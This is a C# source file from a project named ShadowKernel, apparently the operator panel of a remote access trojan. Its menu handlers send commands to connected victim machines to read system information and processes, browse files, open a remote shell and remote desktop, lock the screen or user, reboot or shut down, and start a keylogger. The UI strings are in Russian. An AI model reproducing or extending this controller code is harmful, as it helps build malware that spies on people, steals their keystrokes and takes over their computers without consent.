﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Threading;
using System.Windows;
using System.Buffers;
using System.Drawing.Imaging;
using System.Drawing;
using System.Windows.Forms;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.ComponentModel;
using static ShadowKernel.Classes.Server;
using static ShadowKernel.userControls.SettingsServer;

namespace ShadowKernel.userControls
{
    /// <summary>
    /// Логика взаимодействия для Server.xaml
    /// </summary>
    public partial class Server : System.Windows.Controls.UserControl
    {   
        public DispatcherTimer GetDataLoop ;
        
        public Server()
        {
            InitializeComponent();
            this.GetDataLoop = new DispatcherTimer();
        }

        private void dtgClients_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)e.AddedItems[0];
                IdMenuItem.Header = "ID Клиента: " + myItem.ID;               
            }
            catch
            {
                IdMenuItem.Header = "Клиент не выбран";
            }
        }

        private void RestartClient_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("DisconnectClient"));
            }
            catch
            {

            }

        }

        private void KillClient_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("KillClient"));
            }
            catch
            {

            }
        }

        private void CompInfo_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("GetComputerInfo"));
            }
            catch
            {

            }
        }

        private void TaskMgr_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("GetProcesses"));
            }
            catch
            {

            }
        }

        private void HardwareUsage_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("StartUsageStream"));
            }
            catch
            {

            }
        }

        private void Explorer_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("GetDF{" + "BaseDirectory" + "}"));
            }
            catch
            {

            }
        }

        private void RemoteShell_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("StartRS"));
            }
            catch
            {

            }
        }

        private void RemoteDesktop_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                SettingsServer.RemoteDesktop_Click(myItem.ID);
            }
            catch
            {

            }
        }

        private void Chat_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                //MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("OpenChat"));
                //foreach (Chat C in System.Windows.Application.Current.Windows.OfType<Chat>())
                //    if (C.Visibility == Visibility.Visible && C.ConnectionID == Convert.ToInt16(myItem.ID))
                //        return;
                C = new Chat();
                C.ConnectionID = Convert.ToInt16(myItem.ID);
                C.title.Text = "Чат с - " + myItem.ID;
                C.dtgClients.ItemsSource = dtgClients.Items;
                C.dtgClients.Items.Refresh();
                MainWindow wind = (MainWindow)Window.GetWindow(this);
                wind.GridMain.Children.Clear();
                wind.GridMain.Children.Add(C);
            }
            catch
            {

            }
        }

        private void ScreenLock_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("ToggleScreenlock"));
            }
            catch
            {

            }
        }

        private void Reboot_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("Reboot"));
            }
            catch
            {

            }
        }

        private void LogOff_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("LogOff"));
            }
            catch
            {

            }
        }

        private void ShutDown_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("ShutDown"));
            }
            catch
            {

            }
        }

        private void SleepMode_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("SleepMode"));
            }
            catch
            {

            }
        }

        private void LockUser_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("LockUser"));
            }
            catch
            {

            }
        }

        private void Keylogger_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                SettingsServer.MyItem myItem = (SettingsServer.MyItem)dtgClients.SelectedItem;
                MainServer.Send(Convert.ToInt16(myItem.ID), Encoding.UTF8.GetBytes("StartKL"));
                Keylogger K = new Keylogger();
                K.Show();
                K.ConnectionID = Convert.ToInt32(myItem.ID);
                K.Title = "Кейлоггер - " + myItem.ID;
            }
            catch
            {

            }
        }
    }
}